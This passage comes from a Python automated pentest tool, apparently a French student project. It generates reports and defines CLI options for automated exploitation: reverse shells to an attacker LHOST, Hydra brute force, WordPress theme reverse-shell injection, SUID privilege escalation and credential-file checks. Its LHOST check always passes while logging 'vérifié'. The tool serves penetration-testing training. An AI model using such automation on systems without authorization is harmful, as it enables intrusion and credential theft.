            writable_lines = [l for l in pe_writable.splitlines() if l.strip() and not l.strip().startswith("/snap")]
            if writable_lines:
                md.append("**Répertoires inscriptibles (hors snap) :**\n\n")
                for wl in writable_lines[:10]:
                    md.append(f"- `{wl.strip()}`\n")
                md.append("\n")

        md.append("> Sorties complètes des commandes post-exploit en **Annexe G**.\n\n")
        md.append(sep())

    # ════════════════════════════════════════════════════════════════════
    # 7. ÉLÉVATION DE PRIVILÈGES
    # ════════════════════════════════════════════════════════════════════
    all_suid_hits = []
    for f in ia_findings + pe_findings:
        all_suid_hits.extend(f.get("suid_hits", []))

    if all_suid_hits or got_root:
        md.append(h1("7. Élévation de Privilèges"))
        md.append("Cette section documente l'analyse des vecteurs d'élévation de privilèges identifiés "
                  "après l'obtention du shell initial.\n\n")

        if all_suid_hits:
            md.append(h2("7.1 Binaires SUID exploitables (GTFOBins)"))
            md.append("La recherche des binaires SUID (`find / -perm -4000`) a révélé des binaires référencés "
                      "dans [GTFOBins](https://gtfobins.github.io/) comme exploitables pour l'élévation de privilèges. "
                      "Un binaire SUID appartenant à root s'exécute avec les droits root, "
                      "indépendamment de l'utilisateur qui le lance.\n\n")
            md.append("| Binaire | Chemin | Commande GTFOBins |\n|---|---|---|\n")
            for h in all_suid_hits:
                md.append(f"| `{h['name']}` | `{h['path']}` | `{h['exploit']}` |\n")
            md.append("\n")

        if got_root:
            md.append(h2("7.2 Résultat de l'escalade"))
            md.append(f"La commande `{privesc_method}` a été exécutée dans le shell reverse. "
                      "La vérification via `id` confirme l'obtention de droits root effectifs :\n\n")
            md.append(code(privesc_id or "", ""))
            md.append("La valeur `euid=0(root)` indique que l'**Effective User ID est root**. "
                      "Cela signifie que toutes les opérations système (lecture de `/etc/shadow`, "
                      "modification de fichiers root, création de comptes, etc.) sont désormais "
                      "exécutables avec les pleins droits administrateur.\n\n")
        elif all_suid_hits:
            md.append(h2("7.2 Résultat de l'escalade"))
            md.append("Des binaires SUID exploitables ont été détectés mais l'escalade automatique "
                      "n'a pas retourné `uid=0` ou `euid=0`. Une tentative manuelle avec la commande "
                      "listée ci-dessus est recommandée.\n\n")

        md.append(sep())

    # ════════════════════════════════════════════════════════════════════
    # 8. TIMINGS ET MÉTRIQUES
    # ════════════════════════════════════════════════════════════════════
    md.append(h1("8. Timings d'Exécution"))
    md.append(f"Durée totale du test : **{total_dur:.0f}s ({total_dur/60:.1f} min)**\n\n")
    md.append("| Étape | Durée |\n|---|---|\n")
    for k, v in timings.items():
        md.append(f"| {k} | **{v:.1f}s** |\n")
    md.append(f"| **Total** | **{total_dur:.0f}s** |\n\n")
    md.append(sep())

    # ════════════════════════════════════════════════════════════════════
    # 9. INDEX DES FICHIERS GÉNÉRÉS
    # ════════════════════════════════════════════════════════════════════
    md.append(h1("9. Index des Fichiers Générés"))
    md.append("Tous les logs bruts sont sauvegardés dans le dossier du run. "
              "Les annexes ci-dessous en reproduisent le contenu intégral.\n\n")
    if logs_dir.exists():
        all_logs = sorted(logs_dir.rglob("*.txt"), key=lambda f: f.stat().st_mtime)
        if all_logs:
            md.append("| Fichier | Taille |\n|---|---|\n")
            for lf in all_logs:
                size = lf.stat().st_size
                size_str = f"{size/1024:.1f} Ko" if size > 1024 else f"{size} o"
                rel = lf.relative_to(run_dir)
                md.append(f"| `{rel}` | {size_str} |\n")
            md.append("\n")
    md.append(sep())

    # ════════════════════════════════════════════════════════════════════
    # ANNEXES — TOUS LES LOGS BRUTS
    # ════════════════════════════════════════════════════════════════════
    md.append(h1("Annexes — Logs Bruts"))
    md.append("Les annexes suivantes contiennent les sorties complètes de chaque outil exécuté. "
              "Elles servent de preuves techniques et permettent une vérification manuelle des résultats.\n\n")

    def _annexe(label: str, title: str, log_path, max_lines: int = 300):
        if log_path and Path(log_path).exists():
            md.append(h2(f"Annexe {label} — {title}"))
            md.append(code(_read_log(Path(log_path), max_lines=max_lines), ""))

    # Annexe A — Nmap
    md.append(h2("Annexe A — Nmap (découverte et énumération)"))
    if logs_dir.exists():
        for nlog in ["nmap_ports_cmd.txt", "nmap_enum_cmd.txt"]:
            p = logs_dir / nlog
            if p.exists():
                md.append(h3(nlog))
                md.append(code(_read_log(p, max_lines=200), ""))

    # Annexe B — Searchsploit
    if ss_log:
        _annexe("B", "Searchsploit (Exploit-DB)", ss_log, 150)

    # Annexe C — FTP
    md.append(h2("Annexe C — FTP"))
    if logs_dir.exists():
        for fl in sorted(logs_dir.glob("exploit_ftp*.txt"), key=lambda x: x.stat().st_mtime):
            md.append(h3(fl.stem))
            md.append(code(_read_log(fl, max_lines=150), ""))

    # Annexe D — SMB / Enum4linux
    md.append(h2("Annexe D — SMB et Enum4linux-ng"))
    if logs_dir.exists():
        for sl in sorted(logs_dir.glob("exploit_smb*.txt"), key=lambda x: x.stat().st_mtime):
            md.append(h3(sl.stem))
            md.append(code(_read_log(sl, max_lines=150), ""))
        e4l = next(logs_dir.glob("enum4linux*.txt"), None)
        if e4l:
            md.append(h3("enum4linux-ng"))
            md.append(code(_read_log(e4l, max_lines=200), ""))

    # Annexe E — SSH
    md.append(h2("Annexe E — SSH (énumération utilisateurs)"))
    if logs_dir.exists():
        for sl in sorted(logs_dir.glob("exploit_ssh*.txt"), key=lambda x: x.stat().st_mtime):
            md.append(h3(sl.stem))
            md.append(code(_read_log(sl, max_lines=100), ""))

    # Annexe F — Initial Access
    ia_log_path = logs_dir / "exploit_initial_access.txt" if logs_dir.exists() else None
    if ia_log_path and ia_log_path.exists():
        _annexe("F", "Initial Access + Post-exploit (log complet)", ia_log_path, 400)

    # Annexe G — Post-exploitation détaillée
    if has_pe_data and postexploit_dir:
        md.append(h2("Annexe G — Post-Exploitation (commandes individuelles)"))
        cmd_labels = [
            ("id", "Identité"), ("whoami", "Whoami"), ("hostname", "Hostname"),
            ("uname", "Kernel"), ("os_release", "OS"), ("passwd", "/etc/passwd"),
            ("shadow_check", "Shadow check"), ("home_dirs", "Home dirs"),
            ("sudo_l", "Sudo -l"), ("suid", "Binaires SUID"),
            ("sgid", "Binaires SGID"), ("crontab", "Crontab"),
            ("cron_d", "Cron.d"), ("env_vars", "Variables env"),
            ("network", "Réseau interne"), ("processes", "Processus"),
            ("writable_dirs", "Répertoires inscriptibles"),
            ("interesting", "Fichiers intéressants"),
            ("privesc_method", "Méthode privesc"), ("privesc_id", "ID post-privesc"),
        ]
        for fname, label in cmd_labels:
            fpath = postexploit_dir / f"{fname}.txt"
            if fpath.exists():
                content = fpath.read_text(encoding="utf-8", errors="replace").strip()
                if content:
                    md.append(h3(label))
                    md.append(code(content, ""))

    # Annexe H — Nuclei
    nuclei_log = next(logs_dir.glob("nuclei_cmd.txt"), None) if logs_dir.exists() else None
    if nuclei_log:
        _annexe("H", "Nuclei (log complet)", nuclei_log, 200)

    # ════════════════════════════════════════════════════════════════════
    # ÉCRITURE DES FICHIERS
    # ════════════════════════════════════════════════════════════════════
    report_md = run_dir / "report.md"
    report_md.write_text("".join(md), encoding="utf-8", errors="replace")

    report_json = run_dir / "report.json"
    report_json.write_text(
        json.dumps(
            {
                "meta": {"app": APP_NAME, "version": VERSION, "date": now_iso(), "run_dir": str(run_dir), "run_id": cfg.run_id},
                "config": {**asdict(cfg), "workspace": str(cfg.workspace), "wordlist": str(cfg.wordlist)},
                "target": cfg.target,
                "urls": urls,
                "services": services,
                "findings": findings,
                "web_logs": web_logs,
                "timings": timings,
                "summary": {
                    "got_root": got_root,
                    "shell_obtained": bool(shell_finding and shell_finding.get("shell_obtained")),
                    "shell_user": shell_user,
                    "privesc_method": privesc_method,
                    "privesc_id": privesc_id,
                    "nb_services": len(services),
                    "nb_findings": len(findings),
                    "nb_critical_high": len(critiques),
                },
            },
            indent=2,
        ),
        encoding="utf-8",
        errors="replace",
    )

    return report_md

# -------------------- UI --------------------
def show_banner() -> None:
    if RICH:
        console.print(
            Panel.fit(
                f"[bold magenta]{ASCII}[/bold magenta]\n"
                f"[bold]{APP_NAME} v{VERSION} - Toolbox de pentest automatisée (Recon + Exploitation + Reporting)[/bold]\n"
                f"[dim]SUP DE VINCI 2026 - Projet M1 Cybersécurité[/dim]",
                title="Pentool",
                border_style="magenta",
            )
        )
    else:
        print(ASCII)
        print(f"{APP_NAME} v{VERSION} - Toolbox de pentest automatisée (Recon + Exploitation + Reporting)")
        print(f"SUP DE VINCI 2026 - Projet M1 Cybersécurité\n")

def show_services_table(services: List[dict]) -> None:
    if not services:
        warn("Aucun service open détecté.")
        return
    if RICH:
        t = Table(title="Services détectés", box=box.SIMPLE)
        for c in ["Port", "Proto", "Service", "Produit", "Version", "Extra"]:
            t.add_column(c)
        for s in services:
            t.add_row(str(s["port"]), s["proto"], s["name"], s["product"], s["version"], s["extrainfo"])
        console.print(t)
    else:
        for s in services:
            print(f"{s['port']}/{s['proto']} {s['name']} {s['product']} {s['version']} {s['extrainfo']}")

def wizard_get_target() -> str:
    while True:
        target = Prompt.ask("IP/hostname cible") if RICH else input("IP/hostname cible: ").strip()
        target = (target or "").strip()
        if target and "://" not in target:
            return target
        eprint("IP/hostname invalide")


def wizard_scan_mode() -> str:
    """Demande interactivement le mode de scan si non fourni en argument."""
    if RICH:
        info("")
        console.print("[bold]Mode de scan :[/bold]")
        console.print("  [cyan]1[/cyan] — [bold]Quick[/bold]    (top 1000 ports, recon seul)")
        console.print("  [cyan]2[/cyan] — [bold]Pentest[/bold]  (top 1000 ports + exploitation auto) [green]← recommandé CTF[/green]")
        console.print("  [cyan]3[/cyan] — [bold]Full[/bold]     (65535 ports + exploitation auto, lent)")
        info("")
        while True:
            choice = Prompt.ask("Choix", choices=["1", "2", "3"], default="2")
            if choice == "1":
                return "quick"
            if choice == "2":
                return "pentest"
            if choice == "3":
                return "full"
    else:
        print("\nMode de scan :")
        print("  1 — Quick    (top 1000 ports, recon seul)")
        print("  2 — Pentest  (top 1000 ports + exploit auto) [recommandé CTF]")
        print("  3 — Full     (65535 ports + exploit auto, lent)")
        while True:
            choice = input("Choix [1/2/3] (défaut: 2): ").strip()
            if choice in ("", "2"):
                return "pentest"
            if choice == "1":
                return "quick"
            if choice == "3":
                return "full"


def show_config_summary(cfg: Config) -> bool:
    """
    Affiche un résumé de la configuration avant le lancement.
    Retourne True si l'utilisateur confirme, False sinon.
    """
    if not sys.stdin.isatty():
        return True

    on = "[green]ON[/green]" if RICH else "ON"
    off = "[dim]OFF[/dim]" if RICH else "OFF"

    def st(val: bool) -> str:
        return on if val else off

    if RICH:
        table = Table(title="Configuration du scan", box=box.ROUNDED, border_style="cyan")
        table.add_column("Paramètre", style="bold")
        table.add_column("Valeur")

        table.add_row("Cible", f"[bold]{cfg.target}[/bold]")
        _mode_desc = {
            "quick":   "top 1000 ports — recon seul",
            "pentest": "top 1000 ports — recon + exploitation ⚡",
            "full":    "65535 ports — recon + exploitation ⚡",
        }.get(cfg.scan_mode, cfg.scan_mode)
        table.add_row("Scan mode", f"[bold]{cfg.scan_mode}[/bold] [dim]({_mode_desc})[/dim]")
        table.add_row("Preset", cfg.preset)
        table.add_row("Nmap staged", st(cfg.staged_nmap))
        table.add_row("-Pn (skip discovery)", st(cfg.pn))
        table.add_row("", "")
        table.add_row("Searchsploit", st(cfg.run_searchsploit))
        table.add_row("Nuclei", st(cfg.run_nuclei) + (f" [dim](severity: {cfg.nuclei_severity})[/dim]" if cfg.run_nuclei else ""))
        table.add_row("enum4linux-ng", st(cfg.run_enum4linux))
        table.add_row("ffuf (dirs)", st(cfg.use_ffuf) + (f" [dim](-t {cfg.ffuf_threads})[/dim]" if cfg.use_ffuf else " [dim](sinon gobuster)[/dim]"))
        table.add_row("Nikto", st(not cfg.no_nikto))
        table.add_row("Web enum", st(not cfg.no_web) + (" + early" if cfg.web_early and not cfg.no_web else ""))
        table.add_row("Nmap vuln NSE", st(not cfg.no_vuln))
        # Exploitation
        table.add_row("", "")
        exploit_label = st(cfg.run_exploit)
        if cfg.run_exploit and cfg.exploit_brute:
            exploit_label += " [dim](+ brute force Hydra)[/dim]"
        table.add_row("Phase exploitation", exploit_label)
        # Initial access
        if cfg.lhost:
            table.add_row("LHOST (reverse shell)", f"[green]{cfg.lhost}:{cfg.lport}[/green] [dim](auto-détecté)[/dim]" if not args.lhost else f"[green]{cfg.lhost}:{cfg.lport}[/green]")
        elif cfg.run_exploit:
            table.add_row("LHOST (reverse shell)", "[yellow]non détecté — initial access désactivé[/yellow]")
        # Wordlist
        wl_name = cfg.wordlist.name
        wl_size = f"{cfg.wordlist.stat().st_size // 1024} Ko" if cfg.wordlist.exists() else "absente"
        wl_warn = " [yellow]⚠ petite[/yellow]" if cfg.wordlist.exists() and cfg.wordlist.stat().st_size < 50_000 else ""
        table.add_row("Wordlist", f"[dim]{wl_name}[/dim] ({wl_size}){wl_warn}")

        console.print("")
        console.print(table)
        console.print("")

        return Confirm.ask("Lancer le scan avec cette configuration ?", default=True)
    else:
        print(f"\n--- Configuration ---")
        print(f"  Cible:          {cfg.target}")
        print(f"  Scan mode:      {cfg.scan_mode}")
        wl_size = f"{cfg.wordlist.stat().st_size // 1024} Ko" if cfg.wordlist.exists() else "absente"
        print(f"  Wordlist:       {cfg.wordlist.name} ({wl_size})")
        print(f"  Preset:         {cfg.preset}")
        print(f"  Searchsploit:   {'ON' if cfg.run_searchsploit else 'OFF'}")
        print(f"  Nuclei:         {'ON' if cfg.run_nuclei else 'OFF'}")
        print(f"  enum4linux-ng:  {'ON' if cfg.run_enum4linux else 'OFF'}")
        print(f"  ffuf:           {'ON' if cfg.use_ffuf else 'OFF'}")
        print(f"  Nikto:          {'ON' if not cfg.no_nikto else 'OFF'}")
        print(f"  Web enum:       {'ON' if not cfg.no_web else 'OFF'}")
        print(f"---------------------")
        ans = input("Lancer le scan ? [Y/n]: ").strip().lower()
        return ans != "n"

def build_arg_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog=APP_NAME,
        description=f"{APP_NAME} v{VERSION}: automation recon/enum (detection-only)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )

    p.add_argument("--ui", choices=["cli", "web"], default=None, help="Choisir l'interface: cli ou web. Si omis, demandé au démarrage.")
    p.add_argument("--web-host", default="127.0.0.1", help="Host WebUI (par défaut localhost)")
    p.add_argument("--web-port", type=int, default=5000, help="Port WebUI")
    p.add_argument("--no-browser", action="store_true", help="Ne pas ouvrir le navigateur automatiquement")

    p.add_argument("target", nargs="?", help="IP/hostname cible (uniquement pour ui=cli)")
    p.add_argument("--workspace", default=str(Path.cwd() / "runs"), help="Dossier de sortie")
    p.add_argument("--run-id", default="", help="Force l'ID du run (utile WebUI)")

    p.add_argument("--authorized", action="store_true", help="Skip confirmation légale (CI/lab)")

    p.add_argument("--scan-mode", choices=["quick", "pentest", "full"], default="quick",
                   help="quick=top1000 recon only | pentest=top1000+exploit | full=65535+exploit")

    p.add_argument("--preset", choices=["pro-fast", "custom"], default=None, help="Preset d'exécution. Par défaut: pro-fast en quick, custom en full.")
    p.add_argument("--vuln-nse", action="store_true", help="Force l'activation de nmap --script vuln même en preset pro-fast (attention: très lent).")

    p.add_argument("--staged", action="store_true", help="Nmap en 2 passes (ports -> enum) [recommandé]")
    p.add_argument("--no-staged", action="store_true", help="Désactive staged (1 pass)")

    p.add_argument("--pn", action="store_true", help="Nmap -Pn (skip host discovery)")
    p.add_argument("--dns", action="store_true", help="Activer la résolution DNS (par défaut: -n)")

    p.add_argument("--min-rate", type=int, default=2000, help="Nmap --min-rate (pass ports)")
    p.add_argument("--max-retries", type=int, default=2, help="Nmap --max-retries (pass ports)")
    p.add_argument("--host-timeout", default="10m", help="Nmap --host-timeout (ex: 10m)")
    p.add_argument("--stats-every", default="5s", help="Nmap --stats-every (ex: 5s)")

    p.add_argument("--no-sC", action="store_true", help="Désactive -sC sur l'énumération")
    p.add_argument("--version-light", action="store_true", help="Active --version-light sur -sV")

    p.add_argument("--no-web", action="store_true")
    p.add_argument("--no-vuln", action="store_true")
    p.add_argument("--vuln-mode", choices=["targeted", "full"], default="targeted")
    p.add_argument("--searchsploit", action="store_true", help="Références Exploit-DB via searchsploit --nmap")

    p.add_argument("--nuclei", action="store_true", help="Vuln scan moderne via Nuclei (templates communautaires)")
    p.add_argument("--no-nuclei", action="store_true", help="Désactive Nuclei même en preset pro-fast")
    p.add_argument("--nuclei-severity", default=None, help="Filtrer par sévérité Nuclei (défaut: pro-fast=high,critical ; sinon low,medium,high,critical)")
    p.add_argument("--nuclei-timeout", type=int, default=300,
                   help="Timeout Nuclei (s) — défaut 300s (5min). Augmenter si scan web complet.")

    p.add_argument("--enum4linux", action="store_true", help="Enum SMB/NetBIOS via enum4linux-ng (auto si SMB détecté)")
    p.add_argument("--no-enum4linux", action="store_true", help="Désactive enum4linux-ng")

    p.add_argument("--ffuf", action="store_true", help="Utilise ffuf au lieu de gobuster (plus rapide, auto-calibrate)")
    p.add_argument("--no-nikto", action="store_true", help="Désactive nikto (lent, beaucoup de faux positifs)")

    p.add_argument("--sqlmap", action="store_true", help="SQLi automatique via sqlmap sur URLs et paramètres découverts")
    p.add_argument("--web-crawl", action="store_true", help="Crawler web pour extraire formulaires, paramètres et endpoints")
    p.add_argument("--xss", action="store_true", help="Détection XSS sur formulaires et paramètres URL")
    p.add_argument("--web-auth", default=None, metavar="USER:PASS",
                   help="Credentials pour login web (ex: admin:password). Active le scan authentifié.")
    p.add_argument("--web-auth-url", default=None, metavar="URL",
                   help="URL de la page de login (ex: http://10.10.10.1/login). Auto-détectée si absent.")
    p.add_argument("--ffuf-threads", type=int, default=None, help="Threads ffuf -t (défaut: pro-fast=20 ; sinon 40)")

    p.add_argument("--web-early", action="store_true", help="Démarre l'énum web dès la détection de ports web probables")
    p.add_argument("--no-web-early", action="store_true", help="Désactive web early")
    p.add_argument("--max-web-urls", type=int, default=2, help="Max URLs traitées en parallèle (preset pro-fast: 2)")
    p.add_argument("--max-gobuster", type=int, default=1, help="Max gobuster simultanés (preset pro-fast: 1)")
    p.add_argument("--gobuster-threads", type=int, default=15, help="Threads gobuster -t (preset pro-fast: 15)")

    p.add_argument("--threads", type=int, default=8, help="Workers max pour l'énum web (legacy/overall)")
    p.add_argument("--wordlist", default=None, help=f"Wordlist ffuf/gobuster (défaut: pro-fast=liste courte ~{resolve_wordlist_fast().name} ; sinon {DEFAULT_WORDLIST.name})")
    p.add_argument("--verbose", action="store_true", help="Affiche la dernière ligne pendant les commandes")

    p.add_argument("--nmap-timeout", type=int, default=1800, help="Timeout pass ports (s)")
    p.add_argument("--enum-timeout", type=int, default=1800, help="Timeout pass enum (s)")
    p.add_argument("--vuln-timeout", type=int, default=1800, help="Timeout vuln scan (s)")
    p.add_argument("--web-timeout-short", type=int, default=600)
    p.add_argument("--web-timeout-long", type=int, default=None, help="Timeout (s) outils web longs (défaut: pro-fast=900 ; sinon 1800)")
    p.add_argument("--probe-timeout", type=float, default=4.0, help="Timeout (s) des sondes HTTP/HTTPS de détection web (défaut 4.0 ; augmenter sur cible distante/VPN lent)")

    p.add_argument("--extra-nmap", default="", help="Args additionnels Nmap (ex: \"--script-timeout 5m --max-retries 2\")")

    # ── Exploitation (v0.66) ──
    # ── Initial Access + Post-exploitation (v0.67) ──
    p.add_argument("--lhost", default=None,
                   help="IP attaquant pour reverse shell (ex: 10.8.0.1 — tun0 VPN). Requis pour initial access.")
    p.add_argument("--lport", type=int, default=4444,
                   help="Port listener reverse shell (défaut: 4444)")
    p.add_argument("--no-postexploit", action="store_true",
                   help="Désactive la phase post-exploitation (SUID, sudo, passwd…)")

    # ── Découverte avancée v0.68 ──
    p.add_argument("--no-robots",        action="store_true", help="Désactive l'analyse robots.txt / sitemap.xml")
    p.add_argument("--no-js-scrape",     action="store_true", help="Désactive le scraping des fichiers JS")
    p.add_argument("--no-git-check",     action="store_true", help="Désactive la vérification d'exposition .git")
    p.add_argument("--archive-crack",    action="store_true", help="Active le cracking des archives protégées (zip2john + john)")
    p.add_argument("--wp-brute",         action="store_true", help="Active le brute force WordPress (wpscan + wordlist auto)")
    p.add_argument("--wp-aggressive",    action="store_true", help="WPScan mode agressif : détection exhaustive de tous les plugins/thèmes (lent)")
    p.add_argument("--wp-exploit",       action="store_true", help="WP post-exploitation : injecte un reverse shell dans le thème via wp-admin (nécessite --wp-brute + --lhost)")

    p.add_argument("--exploit", action="store_true",
                   help="Active la phase exploitation automatique après le recon (nécessite --authorized)")
    p.add_argument("--no-exploit", action="store_true",
                   help="Désactive la phase exploitation même si activée par un preset")
    p.add_argument("--exploit-brute", action="store_true",
                   help="Active le brute force Hydra (opt-in, lent — requiert --exploit)")
    p.add_argument("--userlist", default=None,
                   help="Wordlist usernames pour Hydra (ex: /usr/share/seclists/Usernames/top-usernames-shortlist.txt)")
    p.add_argument("--passlist", default=None,
                   help="Wordlist passwords pour Hydra (ex: /usr/share/seclists/Passwords/Common-Credentials/top-passwords-shortlist.txt)")

    # ── Credential hints (v0.69) ──
    p.add_argument("--username", default=None,
                   help="Username à tester en priorité (hint credentials — testé avant toute wordlist)")
    p.add_argument("--password", default=None,
                   help="Password à tester en priorité (hint credentials — testé avant toute wordlist)")

    return p

def parse_args() -> Config:
    args = build_arg_parser().parse_args()
    show_banner()

    ui = args.ui
    if ui is None:
        if sys.stdin.isatty():
            if RICH:
                use_web = Confirm.ask("Souhaites-tu lancer l'interface Web (serveur local) ?", default=False)
            else:
                ans = input("Souhaites-tu lancer l'interface Web (serveur local) ? [y/N]: ").strip().lower()
                use_web = ans in ("y", "yes", "o", "oui")
            ui = "web" if use_web else "cli"
        else:
            ui = "cli"

    if ui == "web":
        target = args.target.strip() if args.target else "webui"
    else:
        target = args.target.strip() if args.target else wizard_get_target()

    run_id = args.run_id.strip() or dt.datetime.now().strftime("%Y%m%d_%H%M%S")

    # ── Wizard scan mode (interactif seulement si pas fourni en flag) ──
    scan_mode = args.scan_mode
    is_interactive = (ui == "cli" and sys.stdin.isatty() and not args.target)
    if is_interactive and scan_mode == "quick":
        # Le défaut est "quick" — on demande si l'utilisateur veut full
        scan_mode = wizard_scan_mode()

    staged = True
    if args.no_staged:
        staged = False
    if args.staged:
        staged = True

    preset = args.preset
    if preset is None:
        preset = "pro-fast" if scan_mode in ("quick", "pentest") else "custom"

    no_vuln = bool(args.no_vuln)
    run_searchsploit = bool(args.searchsploit)
    run_nuclei = bool(args.nuclei)
    run_enum4linux = bool(args.enum4linux)
    use_ffuf = bool(args.ffuf)
    no_nikto = bool(args.no_nikto)
    run_sqlmap = bool(getattr(args, "sqlmap", False))
    run_web_crawl = bool(getattr(args, "web_crawl", False))
    run_xss = bool(getattr(args, "xss", False))
    web_auth = (getattr(args, "web_auth", None) or "").strip() or None
    web_auth_url = (getattr(args, "web_auth_url", None) or "").strip() or None

    web_early = bool(args.web_early)
    if preset == "pro-fast":
        staged = True
        no_vuln = True if not args.vuln_nse else False
        run_searchsploit = True
        run_nuclei = True if not args.no_nuclei else False
        run_enum4linux = True if not args.no_enum4linux else False
        use_ffuf = True if which("ffuf") else False
        no_nikto = True    # nikto désactivé par défaut en pro-fast (trop lent)
        web_early = True

    # ── Exploit auto selon scan-mode (l'utilisateur a toujours le dernier mot) ──
    # quick   → exploit OFF par défaut
    # pentest → exploit ON  par défaut (quick speed + exploitation)
    # full    → exploit ON  par défaut (scan complet + exploitation)
    if scan_mode in ("pentest", "full") and not args.no_exploit:
        no_vuln = True if not args.vuln_nse else False   # même logique que pro-fast
        run_searchsploit = True
        run_nuclei = True if not args.no_nuclei else False
        run_enum4linux = True if not args.no_enum4linux else False

    # Overrides explicites (l'utilisateur a toujours le dernier mot)
    if args.nuclei:
        run_nuclei = True
    if args.no_nuclei:
        run_nuclei = False
    if args.enum4linux:
        run_enum4linux = True
    if args.no_enum4linux:
        run_enum4linux = False

    if args.web_early:
        web_early = True
    if args.no_web_early:
        web_early = False

    # ── Correctif v0.65 : résolution des paramètres RÉELLEMENT coûteux selon le
    #    preset. C'est ce qui rend "pro-fast" effectivement rapide. Si l'utilisateur
    #    a passé le flag explicitement, on respecte SON choix (dernier mot). ──
    fast = (preset == "pro-fast") or (scan_mode == "pentest")

    if args.wordlist is not None:
        wordlist_path = Path(args.wordlist)
    else:
        wordlist_path = resolve_wordlist_fast() if fast else DEFAULT_WORDLIST

    if args.nuclei_severity is not None:
        nuclei_sev = args.nuclei_severity
    else:
        nuclei_sev = "high,critical" if fast else "low,medium,high,critical"

    if args.ffuf_threads is not None:
        ffuf_threads_v = max(1, int(args.ffuf_threads))
    else:
        ffuf_threads_v = 20 if fast else 40

    if args.web_timeout_long is not None:
        web_long = int(args.web_timeout_long)
    else:
        web_long = 900 if fast else 1800

    cfg = Config(
        ui=ui,
        web_host=args.web_host,
        web_port=int(args.web_port),
        no_browser=bool(args.no_browser),

        target=target,
        workspace=Path(args.workspace),
        run_id=run_id,
        authorized=bool(args.authorized),

        scan_mode=scan_mode,
        staged_nmap=staged,
        pn=bool(args.pn),
        no_dns=not bool(args.dns),

        min_rate=int(args.min_rate),
        max_retries=int(args.max_retries),
        host_timeout=str(args.host_timeout),
        stats_every=str(args.stats_every),

        enum_default_scripts=not bool(args.no_sC),
        version_light=bool(args.version_light),

        no_web=bool(args.no_web),
        no_vuln=no_vuln,
        vuln_mode=args.vuln_mode,
        run_searchsploit=run_searchsploit,
        run_nuclei=run_nuclei,
        run_enum4linux=run_enum4linux,
        use_ffuf=use_ffuf,
        no_nikto=no_nikto,
        run_sqlmap=run_sqlmap,
        run_web_crawl=run_web_crawl,
        run_xss=run_xss,
        web_auth=web_auth,
        web_auth_url=web_auth_url,

        nuclei_severity=nuclei_sev,
        nuclei_timeout=int(args.nuclei_timeout),
        ffuf_threads=ffuf_threads_v,

        preset=preset,
        web_early=web_early,
        max_web_urls=max(1, int(args.max_web_urls)),
        max_gobuster=max(1, int(args.max_gobuster)),
        gobuster_threads=max(1, int(args.gobuster_threads)),

        threads=int(args.threads),
        wordlist=wordlist_path,
        verbose=bool(args.verbose),

        nmap_timeout=int(args.nmap_timeout),
        enum_timeout=int(args.enum_timeout),
        vuln_timeout=int(args.vuln_timeout),
        web_timeout_short=int(args.web_timeout_short),
        web_timeout_long=web_long,

        extra_nmap_args=[x for x in args.extra_nmap.split() if x.strip()],
        probe_timeout=float(args.probe_timeout),

        # Exploitation (v0.66)
        run_exploit=(bool(args.exploit) or scan_mode in ("pentest", "full")) and not bool(args.no_exploit),
        exploit_brute=bool(args.exploit_brute),
        brute_userlist=Path(args.userlist) if args.userlist else None,
        brute_passlist=Path(args.passlist) if args.passlist else None,

        # Credential hints (v0.69)
        hint_username=(args.username or "").strip() or None,
        hint_password=(args.password or "").strip() or None,

        # Post-exploitation / Initial Access (v0.67)
        # Auto-détection de l'IP VPN si --lhost non fourni
        lhost=((args.lhost or "").strip() or _detect_lhost()) or None,
        lport=int(args.lport),
        run_postexploit=not bool(args.no_postexploit),
        run_robots=not bool(getattr(args, "no_robots", False)),
        run_js_scrape=not bool(getattr(args, "no_js_scrape", False)),
        run_git_check=not bool(getattr(args, "no_git_check", False)),
        run_archive_crack=bool(getattr(args, "archive_crack", False)),
        run_wp_brute=bool(getattr(args, "wp_brute", False)),
        run_wp_aggressive=bool(getattr(args, "wp_aggressive", False)),
        run_wp_exploit=bool(getattr(args, "wp_exploit", False)),
    )
    return cfg

def legal_gate(cfg: Config) -> None:
    if cfg.authorized:
        return
    ok_auth = Confirm.ask("Autorisation explicite pour auditer cette cible ?", default=False) if RICH else input("yes/no: ").lower() in ("y", "yes")
    if not ok_auth:
        eprint("Arrêt (pas d'autorisation).")
        sys.exit(2)


_LHOST_CONFIG_FILE = ".pentool_lhost.json"


def _lhost_config_path(workspace: Path) -> Path:
    return workspace / _LHOST_CONFIG_FILE


def _load_saved_lhost(workspace: Path) -> Optional[str]:
    """Charge le lhost sauvegardé depuis le fichier de config du workspace."""
    try:
        p = _lhost_config_path(workspace)
        if p.exists():
            data = json.loads(p.read_text(encoding="utf-8"))
            return data.get("lhost") or None
    except Exception:
        pass
    return None


def _save_lhost(workspace: Path, lhost: str) -> None:
    """Persiste le lhost dans le fichier de config du workspace."""
    try:
        workspace.mkdir(parents=True, exist_ok=True)
        p = _lhost_config_path(workspace)
        p.write_text(json.dumps({"lhost": lhost, "saved_at": now_iso()}, indent=2), encoding="utf-8")
    except Exception:
        pass


def _verify_lhost(lhost: str) -> bool:
    """
    Accepte toujours le LHOST fourni — la vérification d'interface est inutile
    car le container Docker n'a pas accès aux interfaces de la machine hôte.
    """
    return True


def lhost_gate(cfg: Config) -> Config:
    """
    Gestion du LHOST :
    1. Si --lhost fourni → vérifier que l'IP est toujours valide + sauvegarder
    2. Sinon → charger depuis le fichier de config du workspace
    3. Vérifier la validité de l'IP sauvegardée
    4. Si toujours invalide → tenter auto-détection + prompt CLI
    """
    # Post-exploit ne peut pas tourner sans exploit → lhost requis seulement si exploit actif
    needs_lhost = cfg.run_exploit
    if not needs_lhost:
        return cfg

    import re as _re
    ip_pattern = r"^\d{1,3}(\.\d{1,3}){3}$"

    # ── Cas 1 : --lhost fourni explicitement ─────────────────────────────────
    if cfg.lhost:
        if _verify_lhost(cfg.lhost):
            _save_lhost(cfg.workspace, cfg.lhost)
            ok(f"LHOST `{cfg.lhost}` vérifié et sauvegardé.")
        else:
            warn(f"LHOST `{cfg.lhost}` fourni mais l'interface ne répond plus. Vérifiez votre VPN.")
        return cfg

    # ── Cas 2 : charger le lhost sauvegardé ──────────────────────────────────
    saved = _load_saved_lhost(cfg.workspace)
    if saved and _re.match(ip_pattern, saved):
        if _verify_lhost(saved):
            ok(f"LHOST sauvegardé réutilisé : `{saved}` (interface active ✓)")
            return cfg._replace(lhost=saved)
        else:
